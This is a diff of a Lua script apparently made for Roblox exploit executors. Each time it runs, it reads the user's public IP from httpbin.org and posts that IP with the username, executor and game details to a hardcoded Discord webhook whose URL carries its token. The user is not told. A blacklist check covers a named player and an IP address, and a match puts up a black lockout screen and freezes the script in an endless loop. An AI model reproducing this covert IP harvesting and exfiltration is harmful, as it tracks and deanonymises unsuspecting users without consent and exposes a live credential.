@@ -33,17 +33,18 @@ local Window = Rayfield:CreateWindow({
     }
 })
 
--- === Webhook Integration ===
+-- === Webhook Integration & Blacklist ===
 local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Request function (compatible with multiple executors)
 local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)
 
--- === Blacklist Configuration ===
+-- === Blacklist Data ===
 local BlacklistedUsernames = {
     ["InfxmousLearzy"] = true
 }
@@ -52,24 +53,55 @@ local BlacklistedIPs = {
     ["182.3.39.56"] = true
 }
 
--- === Helper Functions ===
+-- === GUI: Blacklist Overlay ===
+local function showBlacklistScreen()
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.Name = "BlacklistGui"
+    screenGui.Parent = PlayerGui
+
+    local blackFrame = Instance.new("Frame")
+    blackFrame.Size = UDim2.new(1, 0, 1, 0)
+    blackFrame.Position = UDim2.new(0, 0, 0, 0)
+    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+    blackFrame.BorderSizePixel = 0
+    blackFrame.Parent = screenGui
+
+    local label = Instance.new("TextLabel")
+    label.Text = "Kamu telah di blacklist"
+    label.TextColor3 = Color3.fromRGB(255, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.SourceSansBold
+    label.TextScaled = true
+    label.Size = UDim2.new(1, 0, 0, 100)
+    label.Position = UDim2.new(0, 0, 0.5, -50)
+    label.Parent = screenGui
+end
+
+-- === Get IP + Executor Info ===
 local function getClientInfo()
     local ip = "Unknown"
-    local device = identifyexecutor and identifyexecutor() or "Unknown Executor"
+    local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
     if requestFunction then
-        local response = requestFunction({ Url = "https://httpbin.org/ip", Method = "GET" })
-        if response and response.Body then
-            local success, data = pcall(function()
-                return HttpService:JSONDecode(response.Body)
-            end)
-            if success and data and data.origin then
-                ip = data.origin
+        local success, response = pcall(function()
+            return requestFunction({
+                Url = "https://httpbin.org/ip",
+                Method = "GET"
+            })
+        end)
+        if success and response and response.Body then
+            local decoded = HttpService:JSONDecode(response.Body)
+            if decoded and decoded.origin then
+                ip = decoded.origin
             end
         end
     end
-    return ip, device
+    return ip, executor
 end
 
+-- === Get Game Info ===
 local function getGameInfo()
     local success, data = pcall(function()
         return MarketplaceService:GetProductInfo(game.PlaceId)
@@ -80,46 +112,8 @@ local function getGameInfo()
     return "Unknown Game", tostring(game.PlaceId)
 end
 
-local function applyBlacklistScreen()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "BlacklistGui"
-    screenGui.ResetOnSpawn = false
-    screenGui.IgnoreGuiInset = true
-    screenGui.Parent = PlayerGui
-
-    local blackFrame = Instance.new("Frame")
-    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-    blackFrame.Size = UDim2.new(1, 0, 1, 0)
-    blackFrame.BorderSizePixel = 0
-    blackFrame.Parent = screenGui
-
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 0, 100)
-    label.Position = UDim2.new(0, 0, 0.5, -50)
-    label.BackgroundTransparency = 1
-    label.Text = "Kamu telah di blacklist"
-    label.TextColor3 = Color3.fromRGB(255, 0, 0)
-    label.Font = Enum.Font.SourceSansBold
-    label.TextScaled = true
-    label.Parent = screenGui
-end
-
--- === Blacklist Check and Action ===
-local function checkBlacklist()
-    local ip, _ = getClientInfo()
-    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
-
-    if BlacklistedUsernames[username] or BlacklistedIPs[ip] then
-        applyBlacklistScreen()
-        return true
-    end
-    return false
-end
-
 -- === Webhook Execution ===
-local function sendWebhook()
-    if not requestFunction then return end
-    local ip, device = getClientInfo()
+local function sendWebhook(ip, executor)
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
     local gameName, gameId = getGameInfo()
 
@@ -132,7 +126,7 @@ local function sendWebhook()
             ["fields"] = {
                 {["name"] = "Username", ["value"] = username, ["inline"] = true},
                 {["name"] = "IP", ["value"] = ip, ["inline"] = true},
-                {["name"] = "Executor", ["value"] = device, ["inline"] = false},
+                {["name"] = "Executor", ["value"] = executor, ["inline"] = false},
                 {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
                 {["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true},
                 {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true}
@@ -150,8 +144,15 @@ local function sendWebhook()
     })
 end
 
--- === Main Execution ===
+-- === Main Logic ===
 task.spawn(function()
-    if checkBlacklist() then return end
-    sendWebhook()
+    local ip, executor = getClientInfo()
+    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
+
+    if BlacklistedUsernames[username] or BlacklistedIPs[ip] then
+        showBlacklistScreen()
+        while true do task.wait() end
+    end
+
+    sendWebhook(ip, executor)
 end)
